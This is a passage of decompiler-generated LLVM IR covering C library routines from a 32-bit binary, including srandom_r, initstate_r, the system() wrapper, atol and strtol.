  store i32 %v3_8053212, i32* %edi.global-to-local, align 4
  %v1_8053215 = inttoptr i32 %v3_805320d to i32*
  %v2_8053215 = load i32, i32* %v1_8053215, align 4
  store i32 %v2_8053215, i32* %eax.global-to-local, align 4
  %v1_8053217 = inttoptr i32 %v2_8053210 to i32*
  %v2_8053217 = load i32, i32* %v1_8053217, align 4
  %v4_8053217 = add i32 %v2_8053217, %v2_8053215
  store i32 %v4_8053217, i32* %v1_8053217, align 4
  %v0_8053219 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053219 = inttoptr i32 %v0_8053219 to i32*
  %v2_8053219 = load i32, i32* %v1_8053219, align 4
  %v1_805321b = add i32 %v0_8053219, 4
  store i32 %v1_805321b, i32* %edx.global-to-local, align 4
  %v2_805321e = udiv i32 %v2_8053219, 2
  %v1_8053220 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053220 = icmp ult i32 %v1_805321b, %v1_8053220
  %v1_8053222 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053222 = inttoptr i32 %v1_8053222 to i32*
  store i32 %v2_805321e, i32* %v2_8053222, align 4
  %v0_8053225 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053225 = add i32 %v0_8053225, 4
  store i32 %v1_8053225, i32* %eax.global-to-local, align 4
  br i1 %v7_8053220, label %dec_label_pc_805322e, label %dec_label_pc_805322a

dec_label_pc_805322a:                             ; preds = %dec_label_pc_805320d
  %v0_805322a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_805322a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053234

dec_label_pc_805322e:                             ; preds = %dec_label_pc_805320d
  %v1_805322e = load i32, i32* %edi.global-to-local, align 4
  %v7_805322e = icmp ult i32 %v1_8053225, %v1_805322e
  br i1 %v7_805322e, label %dec_label_pc_8053234, label %dec_label_pc_8053232

dec_label_pc_8053232:                             ; preds = %dec_label_pc_805322e
  %v0_8053232 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053232, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053234

dec_label_pc_8053234:                             ; preds = %dec_label_pc_805322e, %dec_label_pc_805322a, %dec_label_pc_8053232
  %v0_8053234 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053234 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053234 = inttoptr i32 %v1_8053234 to i32*
  store i32 %v0_8053234, i32* %v2_8053234, align 4
  %v0_8053236 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053236 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053236 = add i32 %v1_8053236, 4
  %v3_8053236 = inttoptr i32 %v2_8053236 to i32*
  store i32 %v0_8053236, i32* %v3_8053236, align 4
  br label %dec_label_pc_8053239

dec_label_pc_8053239:                             ; preds = %dec_label_pc_80531f6, %dec_label_pc_8053234
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805323b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805323b, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_8053201, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053239, { 1, 0 }
  uselistorder label %dec_label_pc_8053234, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8053240 = load i32, i32* @ebp, align 4
  %v0_8053241 = load i32, i32* @edi, align 4
  %v0_8053242 = load i32, i32* @esi, align 4
  %v0_8053243 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_805324e = trunc i64 %arg1 to i32
  store i32 %v4_805324e, i32* %eax.global-to-local, align 4
  %v1_8053252 = add i32 %arg2, 12
  %v2_8053252 = inttoptr i32 %v1_8053252 to i32*
  %v3_8053252 = load i32, i32* %v2_8053252, align 4
  store i32 %v3_8053252, i32* %edx.global-to-local, align 4
  %v6_8053258 = icmp ugt i32 %v3_8053252, 4
  br i1 %v6_8053258, label %dec_label_pc_80532cc, label %dec_label_pc_805325a

dec_label_pc_805325a:                             ; preds = %entry
  %v1_805325a = add i32 %arg2, 8
  %v2_805325a = inttoptr i32 %v1_805325a to i32*
  %v3_805325a = load i32, i32* %v2_805325a, align 4
  store i32 %v3_805325a, i32* %ebx.global-to-local, align 4
  %v1_805325d = icmp eq i32 %v4_805324e, 0
  %v1_805325f = icmp eq i1 %v1_805325d, false
  br i1 %v1_805325f, label %dec_label_pc_8053263, label %dec_label_pc_8053261

dec_label_pc_8053261:                             ; preds = %dec_label_pc_805325a
  %v1_8053261 = and i32 %v4_805324e, -256
  %v2_8053261 = or i32 %v1_8053261, 1
  store i32 %v2_8053261, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053263

dec_label_pc_8053263:                             ; preds = %dec_label_pc_805325a, %dec_label_pc_8053261
  %v0_8053263 = phi i32 [ %v4_805324e, %dec_label_pc_805325a ], [ %v2_8053261, %dec_label_pc_8053261 ]
  %v2_8053263 = inttoptr i32 %v3_805325a to i32*
  store i32 %v0_8053263, i32* %v2_8053263, align 4
  %v1_8053265 = icmp eq i32 %v3_8053252, 0
  br i1 %v1_8053265, label %dec_label_pc_80532ca, label %dec_label_pc_8053269

dec_label_pc_8053269:                             ; preds = %dec_label_pc_8053263
  %v0_8053269 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8053269, i32* %edx.global-to-local, align 4
  %v0_805326b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_805326b, i32* %ecx.global-to-local, align 4
  %v0_805326d = load i32, i32* @esi, align 4
  %v1_805326d = add i32 %v0_805326d, 16
  %v2_805326d = inttoptr i32 %v1_805326d to i32*
  %v3_805326d = load i32, i32* %v2_805326d, align 4
  store i32 %v3_805326d, i32* %eax.global-to-local, align 4
  %v4_8053275 = sext i32 %v3_805326d to i64
  store i64 %v4_8053275, i64* %stack_var_-40, align 8
  %v5_80532a727 = icmp sgt i32 %v3_805326d, 1
  br i1 %v5_80532a727, label %dec_label_pc_805327a, label %dec_label_pc_80532a9

dec_label_pc_805327a:                             ; preds = %dec_label_pc_8053269, %dec_label_pc_805327a.dec_label_pc_805327a_crit_edge
  %v0_805329e = phi i32 [ %v0_805329e.pre, %dec_label_pc_805327a.dec_label_pc_805327a_crit_edge ], [ %v0_805326b, %dec_label_pc_8053269 ]
  %v0_805327a = phi i32 [ %v0_805327a.pre, %dec_label_pc_805327a.dec_label_pc_805327a_crit_edge ], [ %v0_8053269, %dec_label_pc_8053269 ]
  %v0_80532a128 = phi i32 [ %v0_80532a4.pre, %dec_label_pc_805327a.dec_label_pc_805327a_crit_edge ], [ 1, %dec_label_pc_8053269 ]
  %v1_8053281 = ashr i32 %v0_805327a, 31
  %v2_8053282 = zext i32 %v0_805327a to i64
  %v4_8053282 = zext i32 %v1_8053281 to i64
  %v5_8053282 = mul nuw i64 %v4_8053282, 4294967296
  %v6_8053282 = or i64 %v5_8053282, %v2_8053282
  %v8_8053282 = sdiv i64 %v6_8053282, 127773
  %v9_8053282 = trunc i64 %v8_8053282 to i32
  %v10_8053282 = srem i64 %v6_8053282, 127773
  %v3_8053288 = mul nsw i64 %v10_8053282, 16807
  %v4_8053288 = trunc i64 %v3_8053288 to i32
  %v3_805328e = mul i32 %v9_8053282, 2836
  store i32 %v3_805328e, i32* %eax.global-to-local, align 4
  %v2_8053294 = sub i32 %v4_8053288, %v3_805328e
  %v13_8053294 = icmp slt i32 %v2_8053294, 0
  %v1_8053296 = icmp eq i1 %v13_8053294, false
  %v1_8053298 = add i32 %v2_8053294, 2147483647
  %v2_8053294.v1_8053298 = select i1 %v1_8053296, i32 %v2_8053294, i32 %v1_8053298
  store i32 %v2_8053294.v1_8053298, i32* %edx.global-to-local, align 4
  %v1_805329e = add i32 %v0_805329e, 4
  store i32 %v1_805329e, i32* %ecx.global-to-local, align 4
  %v1_80532a1 = add i32 %v0_80532a128, 1
  store i32 %v1_80532a1, i32* @edi, align 4
  %v2_80532a2 = inttoptr i32 %v1_805329e to i32*
  store i32 %v2_8053294.v1_8053298, i32* %v2_80532a2, align 4
  %v0_80532a4.pre = load i32, i32* @edi, align 4
  %v3_80532a4.pre = load i64, i64* %stack_var_-40, align 8
  %extract.t12 = trunc i64 %v3_80532a4.pre to i32
  %v5_80532a7 = icmp slt i32 %v0_80532a4.pre, %extract.t12
  br i1 %v5_80532a7, label %dec_label_pc_805327a.dec_label_pc_805327a_crit_edge, label %dec_label_pc_80532a4.dec_label_pc_80532a9_crit_edge

dec_label_pc_805327a.dec_label_pc_805327a_crit_edge: ; preds = %dec_label_pc_805327a
  %v0_805327a.pre = load i32, i32* %edx.global-to-local, align 4
  %v0_805329e.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805327a

dec_label_pc_80532a4.dec_label_pc_80532a9_crit_edge: ; preds = %dec_label_pc_805327a
  %v0_80532a9.pre = load i32, i32* @esi, align 4
  %v0_80532ac.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80532a9

dec_label_pc_80532a9:                             ; preds = %dec_label_pc_80532a4.dec_label_pc_80532a9_crit_edge, %dec_label_pc_8053269
  %v0_80532ac = phi i32 [ %v0_80532ac.pre, %dec_label_pc_80532a4.dec_label_pc_80532a9_crit_edge ], [ %v0_805326b, %dec_label_pc_8053269 ]
  %v0_80532a9 = phi i32 [ %v0_80532a9.pre, %dec_label_pc_80532a4.dec_label_pc_80532a9_crit_edge ], [ %v0_805326d, %dec_label_pc_8053269 ]
  %v1_80532a9 = add i32 %v0_80532a9, 20
  %v2_80532a9 = inttoptr i32 %v1_80532a9 to i32*
  %v3_80532a9 = load i32, i32* %v2_80532a9, align 4
  store i32 %v3_80532a9, i32* %eax.global-to-local, align 4
  %v2_80532ac = add i32 %v0_80532a9, 4
  %v3_80532ac = inttoptr i32 %v2_80532ac to i32*
  store i32 %v0_80532ac, i32* %v3_80532ac, align 4
  %v0_80532af = load i32, i32* %ebx.global-to-local, align 4
  %v1_80532af = load i32, i32* %eax.global-to-local, align 4
  %v2_80532af = mul i32 %v1_80532af, 4
  %v3_80532af = add i32 %v2_80532af, %v0_80532af
  store i32 %v3_80532af, i32* %eax.global-to-local, align 4
  %v1_80532b2 = load i32, i32* @esi, align 4
  %v2_80532b2 = inttoptr i32 %v1_80532b2 to i32*
  store i32 %v3_80532af, i32* %v2_80532b2, align 4
  %v3_80532b4 = load i64, i64* %stack_var_-40, align 8
  %v6_80532b4 = mul nsw i64 %v3_80532b4, 10
  %v7_80532b4 = trunc i64 %v6_80532b4 to i32
  %v2_80532ba = ptrtoint i32* %stack_var_-20 to i32
  %v1_80532c724 = add i32 %v7_80532b4, -1
  %v9_80532c725 = icmp slt i32 %v1_80532c724, 0
  store i32 %v1_80532c724, i32* @ebx, align 4
  %v1_80532c826 = icmp eq i1 %v9_80532c725, false
  br i1 %v1_80532c826, label %dec_label_pc_80532ba, label %dec_label_pc_80532ca

dec_label_pc_80532ba:                             ; preds = %dec_label_pc_80532a9, %dec_label_pc_80532ba
  store i32 %v2_80532ba, i32* %eax.global-to-local, align 4
  %v0_80532bf = load i32, i32* @esi, align 4
  %v2_80532c0 = inttoptr i32 %v0_80532bf to i32*
  %v3_80532c0 = call i32 @__GI_random_r(i32* %v2_80532c0, i32 %v2_80532ba)
  store i32 %v0_80532bf, i32* %eax.global-to-local, align 4
  store i32 %v2_80532ba, i32* %edx.global-to-local, align 4
  %v0_80532c7.pre = load i32, i32* @ebx, align 4
  %v1_80532c7 = add i32 %v0_80532c7.pre, -1
  %v9_80532c7 = icmp slt i32 %v1_80532c7, 0
  store i32 %v1_80532c7, i32* @ebx, align 4
  %v1_80532c8 = icmp eq i1 %v9_80532c7, false
  br i1 %v1_80532c8, label %dec_label_pc_80532ba, label %dec_label_pc_80532ca

dec_label_pc_80532ca:                             ; preds = %dec_label_pc_80532a9, %dec_label_pc_80532ba, %dec_label_pc_8053263
  store i32 0, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80532cc

dec_label_pc_80532cc:                             ; preds = %entry, %dec_label_pc_80532ca
  %v0_80532cf = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_80532ca ]
  store i32 %v0_80532cf, i32* %eax.global-to-local, align 4
  store i32 %v0_8053243, i32* @ebx, align 4
  store i32 %v0_8053242, i32* @esi, align 4
  store i32 %v0_8053241, i32* @edi, align 4
  store i32 %v0_8053240, i32* @ebp, align 4
  ret i32 %v0_80532cf

; uselistorder directives
  uselistorder i32 %v0_80532cf, { 1, 0 }
  uselistorder i32 %v1_80532c7, { 1, 0 }
  uselistorder i32 %v0_80532a9, { 1, 0 }
  uselistorder i32 %v0_80532a4.pre, { 1, 0 }
  uselistorder i32 %v2_8053294.v1_8053298, { 1, 0 }
  uselistorder i32 %v0_805327a, { 1, 0 }
  uselistorder i32 %v0_805326b, { 1, 0, 2 }
  uselistorder i64* %stack_var_-40, { 2, 0, 1 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10 }
  uselistorder i64 127773, { 1, 0 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80532cc, { 1, 0 }
  uselistorder label %dec_label_pc_80532ca, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80532ba, { 1, 0 }
  uselistorder label %dec_label_pc_805327a, { 1, 0 }
  uselistorder label %dec_label_pc_8053263, { 1, 0 }
}

define i32 @__GI_initstate_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp7 = ptrtoint i32* %arg2 to i32
  %stack_var_-36 = alloca i32, align 4
  %v0_80532d9 = load i32, i32* @ebx, align 4
  store i32 %arg3, i32* %eax.global-to-local, align 4
  store i32 %tmp7, i32* @ebp, align 4
  store i32 %arg4, i32* @edi, align 4
  %tmp17 = icmp ult i32 %arg3, 128
  br i1 %tmp17, label %dec_label_pc_80532fa, label %dec_label_pc_80532ee

dec_label_pc_80532ee:                             ; preds = %entry
  %v2_80532ee = icmp ult i32 %arg3, 256
  %v1_80532f5 = select i1 %v2_80532ee, i32 5, i32 4
  store i32 %v1_80532f5, i32* @ebx, align 4
  br label %dec_label_pc_8053310

dec_label_pc_80532fa:                             ; preds = %entry
  %v6_80532fd = icmp ugt i32 %arg3, 31
  br i1 %v6_80532fd, label %dec_label_pc_8053308, label %dec_label_pc_80532ff

dec_label_pc_80532ff:                             ; preds = %dec_label_pc_80532fa
  store i32 0, i32* @ebx, align 4
  %v6_8053304 = icmp ugt i32 %arg3, 7
  br i1 %v6_8053304, label %dec_label_pc_8053310, label %dec_label_pc_8053360

dec_label_pc_8053308:                             ; preds = %dec_label_pc_80532fa
  %v2_8053308 = icmp ult i32 %arg3, 64
  %v1_805330d = select i1 %v2_8053308, i32 3, i32 2
  store i32 %v1_805330d, i32* @ebx, align 4
  br label %dec_label_pc_8053310

dec_label_pc_8053310:                             ; preds = %dec_label_pc_80532ff, %dec_label_pc_80532ee, %dec_label_pc_8053308
  %v0_8053310 = phi i32 [ 0, %dec_label_pc_80532ff ], [ %v1_80532f5, %dec_label_pc_80532ee ], [ %v1_805330d, %dec_label_pc_8053308 ]
  %v1_8053310 = mul nuw nsw i32 %v0_8053310, 4
  %v2_8053310 = add i32 %v1_8053310, ptrtoint (i32* @global_var_80608d4.758 to i32)
  %v3_8053310 = inttoptr i32 %v2_8053310 to i32*
  %v4_8053310 = load i32, i32* %v3_8053310, align 4
  store i32 %v4_8053310, i32* %eax.global-to-local, align 4
  %v1_8053317 = add i32 %tmp7, 4
  store i32 %v1_8053317, i32* @esi, align 4
  %v2_805331a = add i32 %arg4, 16
  %v3_805331a = inttoptr i32 %v2_805331a to i32*
  store i32 %v4_8053310, i32* %v3_805331a, align 4
  %v0_805331d = load i32, i32* @ebx, align 4
  %v1_805331d = mul i32 %v0_805331d, 4
  %v2_805331d = add i32 %v1_805331d, ptrtoint (i32* @global_var_80608c0.759 to i32)
  %v3_805331d = inttoptr i32 %v2_805331d to i32*
  %v4_805331d = load i32, i32* %v3_805331d, align 4
  store i32 %v4_805331d, i32* %edx.global-to-local, align 4
  %v0_8053324 = load i32, i32* @esi, align 4
  %v1_8053324 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053324 = mul i32 %v1_8053324, 4
  %v3_8053324 = add i32 %v2_8053324, %v0_8053324
  store i32 %v3_8053324, i32* %eax.global-to-local, align 4
  %v1_8053327 = load i32, i32* @edi, align 4
  %v2_8053327 = add i32 %v1_8053327, 12
  %v3_8053327 = inttoptr i32 %v2_8053327 to i32*
  store i32 %v0_805331d, i32* %v3_8053327, align 4
  %v0_805332a = load i32, i32* %edx.global-to-local, align 4
  %v1_805332a = load i32, i32* @edi, align 4
  %v2_805332a = add i32 %v1_805332a, 20
  %v3_805332a = inttoptr i32 %v2_805332a to i32*
  store i32 %v0_805332a, i32* %v3_805332a, align 4
  %v0_805332d = load i32, i32* %eax.global-to-local, align 4
  %v1_805332d = load i32, i32* @edi, align 4
  %v2_805332d = add i32 %v1_805332d, 24
  %v3_805332d = inttoptr i32 %v2_805332d to i32*
  store i32 %v0_805332d, i32* %v3_805332d, align 4
  %v0_8053330 = load i32, i32* @esi, align 4
  %v1_8053330 = load i32, i32* @edi, align 4
  %v2_8053330 = add i32 %v1_8053330, 8
  %v3_8053330 = inttoptr i32 %v2_8053330 to i32*
  store i32 %v0_8053330, i32* %v3_8053330, align 4
  %v0_8053333 = load i32, i32* @edi, align 4
  store i32 %arg1, i32* %stack_var_-36, align 4
  %v2_8053338 = sext i32 %arg1 to i64
  %v3_8053338 = call i32 @srandom_r(i64 %v2_8053338, i32 %v0_8053333)
  %v0_805333d = load i32, i32* @ebp, align 4
  %v1_805333d = inttoptr i32 %v0_805333d to i32*
  store i32 0, i32* %v1_805333d, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8053348 = load i32, i32* @ebx, align 4
  %v1_8053348 = icmp eq i32 %v0_8053348, 0
  br i1 %v1_8053348, label %dec_label_pc_8053379, label %dec_label_pc_805334c

dec_label_pc_805334c:                             ; preds = %dec_label_pc_8053310
  %v0_805334c = load i32, i32* @edi, align 4
  %v1_805334c = add i32 %v0_805334c, 4
  %v2_805334c = inttoptr i32 %v1_805334c to i32*
  %v3_805334c = load i32, i32* %v2_805334c, align 4
  %v1_805334f = load i32, i32* @esi, align 4
  %v2_805334f = sub i32 %v3_805334c, %v1_805334f
  %v2_8053351 = sdiv i32 %v2_805334f, 4
  %v3_8053354 = mul i32 %v2_8053351, 5
  %v2_8053357 = add i32 %v3_8053354, %v0_8053348
  %v1_8053359 = load i32, i32* @ebp, align 4
  %v2_8053359 = inttoptr i32 %v1_8053359 to i32*
  store i32 %v2_8053357, i32* %v2_8053359, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053379

dec_label_pc_8053360:                             ; preds = %dec_label_pc_80532ff
  %v1_8053360 = call i32 @__errno_location(i32 %v0_80532d9)
  store i32 %v1_8053360, i32* %eax.global-to-local, align 4
  %v1_8053365 = inttoptr i32 %v1_8053360 to i32*
  store i32 22, i32* %v1_8053365, align 4
  %v0_805336b = load i32, i32* %stack_var_-36, align 4
  %v1_805336b = call i32 @__errno_location(i32 %v0_805336b)
  %v1_8053370 = inttoptr i32 %v1_805336b to i32*
  store i32 22, i32* %v1_8053370, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053379

dec_label_pc_8053379:                             ; preds = %dec_label_pc_8053310, %dec_label_pc_805334c, %dec_label_pc_8053360
  %v0_8053380 = phi i32 [ 0, %dec_label_pc_8053310 ], [ 0, %dec_label_pc_805334c ], [ -1, %dec_label_pc_8053360 ]
  ret i32 %v0_8053380

; uselistorder directives
  uselistorder i32* %eax.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg3, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8053379, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053310, { 2, 0, 1 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8053384 = load i32, i32* @ebx, align 4
  %v4_805338d = icmp eq i32 %arg1, 0
  br i1 %v4_805338d, label %dec_label_pc_80534b0, label %dec_label_pc_8053398

dec_label_pc_8053398:                             ; preds = %entry
  %v2_805339e = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_80533ad = call i32 @__bsd_signal(i32 2, i32 1)
  store i32 2, i32* @ebx, align 4
  %v2_80533bc = call i32 @__bsd_signal(i32 17, i32 0)
  %v1_80533c5 = call i32 @__vfork(i32 %v2_80533bc)
  store i32 %v1_80533c5, i32* @ebx, align 4
  %v2_80533cf = icmp slt i32 %v1_80533c5, 0
  %v2_80533d2 = icmp eq i1 %v2_80533cf, false
  br i1 %v2_80533d2, label %dec_label_pc_8053403, label %dec_label_pc_80533d4

dec_label_pc_80533d4:                             ; preds = %dec_label_pc_8053398
  %v2_80533dc = call i32 @__bsd_signal(i32 3, i32 %v2_805339e)
  store i32 %v2_805339e, i32* @edx, align 4
  %v2_80533e9 = call i32 @__bsd_signal(i32 2, i32 %v2_80533ad)
  store i32 2, i32* @ebx, align 4
  %v2_80533f6 = call i32 @__bsd_signal(i32 17, i32 %v2_80533bc)
  br label %dec_label_pc_80534ad

dec_label_pc_8053403:                             ; preds = %dec_label_pc_8053398
  %v1_80533cf = icmp eq i32 %v1_80533c5, 0
  %v1_8053403 = icmp eq i1 %v1_80533cf, false
  br i1 %v1_8053403, label %dec_label_pc_805344f, label %dec_label_pc_8053405

dec_label_pc_8053405:                             ; preds = %dec_label_pc_8053403
  %v2_805340b = call i32 @__bsd_signal(i32 3, i32 0)
  store i32 0, i32* @edx, align 4
  %v2_8053416 = call i32 @__bsd_signal(i32 2, i32 0)
  store i32 2, i32* @ebx, align 4
  %v2_8053421 = call i32 @__bsd_signal(i32 17, i32 0)
  %v8_8053440 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_80608eb.762 to i32), i32 ptrtoint ([3 x i8]* @global_var_80608f0.761 to i32), i32 ptrtoint ([3 x i8]* @global_var_80608e8.760 to i32), i32 %arg1, i32 0)
  %v1_805344a = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_805344f:                             ; preds = %dec_label_pc_8053403
  %v2_8053455 = call i32 @__bsd_signal(i32 3, i32 1)
  store i32 1, i32* @edx, align 4
  %v2_8053460 = call i32 @__bsd_signal(i32 2, i32 1)
  %v2_8053465 = ptrtoint i32* %stack_var_-8 to i32
  %v0_805346e = load i32, i32* @ebx, align 4
  %v7_805346f = call i32 @wait4(i32 %v0_805346e, i32 %v2_8053465, i32 0, i32 0)
  %v8_8053477 = icmp eq i32 %v7_805346f, -1
  %v1_8053478 = icmp eq i1 %v8_8053477, false
  br i1 %v1_8053478, label %dec_label_pc_8053482, label %dec_label_pc_805347a

dec_label_pc_805347a:                             ; preds = %dec_label_pc_805344f
  store i32 -1, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8053482

dec_label_pc_8053482:                             ; preds = %dec_label_pc_805344f, %dec_label_pc_805347a
  %v2_805348a = call i32 @__bsd_signal(i32 3, i32 %v2_805339e)
  store i32 %v2_805339e, i32* @ebx, align 4
  %v2_8053497 = call i32 @__bsd_signal(i32 2, i32 %v2_80533ad)
  store i32 %v2_80533ad, i32* @edx, align 4
  %v2_80534a4 = call i32 @__bsd_signal(i32 17, i32 %v2_80533bc)
  %v3_80534a9 = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_80534ad

dec_label_pc_80534ad:                             ; preds = %dec_label_pc_80533d4, %dec_label_pc_8053482
  %storemerge = phi i32 [ -1, %dec_label_pc_80533d4 ], [ %v3_80534a9, %dec_label_pc_8053482 ]
  br label %dec_label_pc_80534b0

dec_label_pc_80534b0:                             ; preds = %entry, %dec_label_pc_80534ad
  %v0_80534b4 = phi i32 [ 1, %entry ], [ %storemerge, %dec_label_pc_80534ad ]
  store i32 %v0_8053384, i32* @ebx, align 4
  ret i32 %v0_80534b4

; uselistorder directives
  uselistorder i32 %v1_80533c5, { 1, 2, 0 }
  uselistorder i32 %v2_80533bc, { 1, 0, 2 }
  uselistorder i32 %v2_80533ad, { 0, 2, 1 }
  uselistorder i32 %v2_805339e, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 (i32)* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @__bsd_signal, { 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80534b0, { 1, 0 }
  uselistorder label %dec_label_pc_80534ad, { 1, 0 }
  uselistorder label %dec_label_pc_8053482, { 1, 0 }
}

define i32 @atol(i32 %arg1) local_unnamed_addr {
entry:
  %v3_80534c3 = call i32 @strtol(i32 %arg1, i32 0, i32 10)
  ret i32 %v3_80534c3
}

define i32 @strtol(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_80534dd = inttoptr i32 %arg1 to i8*
  %v5_80534dd = call i32 @_stdlib_strto_l(i8* %v4_80534dd, i32 %arg2, i32 %arg3, i32 1)
  ret i32 %v5_80534dd
}

define i32 @_stdlib_strto_l(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-16 = alloca i32, align 4
  %v0_80534eb = load i32, i32* @ebx, align 4
  store i32 %v0_80534eb, i32* %stack_var_-16, align 4
  %v0_80534ef = load i32, i32* @global_var_80612cc, align 4
  %v4_80534f5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80534f5, i32* @ecx, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  store i32 %v4_80534f5, i32* %ebx.global-to-local, align 4
  %v2_805350241 = load i8, i8* %arg1, align 1
  %v3_805350242 = sext i8 %v2_805350241 to i32
  store i32 %v3_805350242, i32* %eax.global-to-local, align 4
  %v2_805350543 = mul nsw i32 %v3_805350242, 2
  %v3_805350544 = add i32 %v2_805350543, %v0_80534ef
  %v4_805350545 = inttoptr i32 %v3_805350544 to i8*
  %v5_805350546 = load i8, i8* %v4_805350545, align 1
  %v6_805350547 = and i8 %v5_805350546, 32
  %v7_805350548 = icmp eq i8 %v6_805350547, 0
  %v1_805350949 = icmp eq i1 %v7_805350548, false
  br i1 %v1_805350949, label %dec_label_pc_8053501, label %dec_label_pc_805350b

dec_label_pc_8053501:                             ; preds = %entry, %dec_label_pc_8053501
  %v0_805350150 = phi i32 [ %v1_8053501, %dec_label_pc_8053501 ], [ %v4_80534f5, %entry ]
  %v1_8053501 = add i32 %v0_805350150, 1
  store i32 %v1_8053501, i32* %ebx.global-to-local, align 4
  %v1_8053502 = inttoptr i32 %v1_8053501 to i8*
  %v2_8053502 = load i8, i8* %v1_8053502, align 1
  %v3_8053502 = sext i8 %v2_8053502 to i32
  store i32 %v3_8053502, i32* %eax.global-to-local, align 4
  %v2_8053505 = mul nsw i32 %v3_8053502, 2
  %v3_8053505 = add i32 %v2_8053505, %v0_80534ef
  %v4_8053505 = inttoptr i32 %v3_8053505 to i8*
  %v5_8053505 = load i8, i8* %v4_8053505, align 1
  %v6_8053505 = and i8 %v5_8053505, 32
  %v7_8053505 = icmp eq i8 %v6_8053505, 0
  %v1_8053509 = icmp eq i1 %v7_8053505, false
  br i1 %v1_8053509, label %dec_label_pc_8053501, label %dec_label_pc_805350b

dec_label_pc_805350b:                             ; preds = %dec_label_pc_8053501, %entry
  %v0_8053501.lcssa = phi i32 [ %v4_80534f5, %entry ], [ %v1_8053501, %dec_label_pc_8053501 ]
  %v2_8053502.lcssa = phi i8 [ %v2_805350241, %entry ], [ %v2_8053502, %dec_label_pc_8053501 ]
  %v3_8053502.lcssa = phi i32 [ %v3_805350242, %entry ], [ %v3_8053502, %dec_label_pc_8053501 ]
  %tmp37 = trunc i32 %arg4 to i8
  %v9_805350b = icmp eq i8 %v2_8053502.lcssa, 43
  br i1 %v9_805350b, label %dec_label_pc_8053520, label %dec_label_pc_8053510

dec_label_pc_8053510:                             ; preds = %dec_label_pc_805350b
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053512 = icmp eq i8 %v2_8053502.lcssa, 45
  %v1_8053515 = icmp eq i1 %v9_8053512, false
  br i1 %v1_8053515, label %dec_label_pc_8053521, label %dec_label_pc_8053520

dec_label_pc_8053520:                             ; preds = %dec_label_pc_805350b, %dec_label_pc_8053510
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8053510 ], [ 0, %dec_label_pc_805350b ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
